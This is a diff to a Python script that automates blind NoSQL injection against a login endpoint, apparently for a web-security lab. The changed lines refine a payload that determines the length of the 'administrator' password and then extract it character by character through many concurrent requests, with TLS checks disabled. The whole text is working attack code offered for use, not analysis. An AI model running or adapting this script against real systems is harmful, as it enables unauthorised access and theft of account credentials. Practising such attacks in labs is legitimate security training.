@@ -56,22 +56,28 @@ async def inject(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload
 # ── Core ───────────────────────────────────────────────────────────────────────
 async def find_length(session: aiohttp.ClientSession, sem: asyncio.Semaphore) -> int:
     print("[*] Finding password length...")
+
+    # Fire all checks concurrently: true condition = password length == n
     tasks = {
         n: asyncio.create_task(inject(
             session, sem,
-            f"administrator' && this.password.length < {n + 1} || 'a'=='b"
+            f"administrator' && this.password.length == {n} || 'a'=='b"
         ))
         for n in range(1, MAX_LEN + 1)
     }
-    for n in range(1, MAX_LEN + 1):
-        if await tasks[n]:
+
+    results = await asyncio.gather(*tasks.values())
+    for n, hit in zip(tasks.keys(), results):
+        if hit:
             print(f"[+] Length: {n}")
             return n
+
     sys.exit("[-] Could not determine password length")
 
 
 async def extract_password(session: aiohttp.ClientSession, sem: asyncio.Semaphore, length: int) -> str:
     print(f"[*] Extracting password ({length * len(CHARSET)} requests)...")
+
     tasks = {
         (i, c): asyncio.create_task(inject(
             session, sem,
@@ -79,6 +85,7 @@ async def extract_password(session: aiohttp.ClientSession, sem: asyncio.Semaphor
         ))
         for i in range(length) for c in CHARSET
     }
+
     password = ["?"] * length
     for (i, c), task in tasks.items():
         if await task:
@@ -94,7 +101,7 @@ async def extract_password(session: aiohttp.ClientSession, sem: asyncio.Semaphor
 async def main():
     print(f"[*] Target: {LAB_URL}\n")
 
-    sem = asyncio.Semaphore(CONCURRENCY)
+    sem       = asyncio.Semaphore(CONCURRENCY)
     connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY)
 
     async with aiohttp.ClientSession(connector=connector) as session:
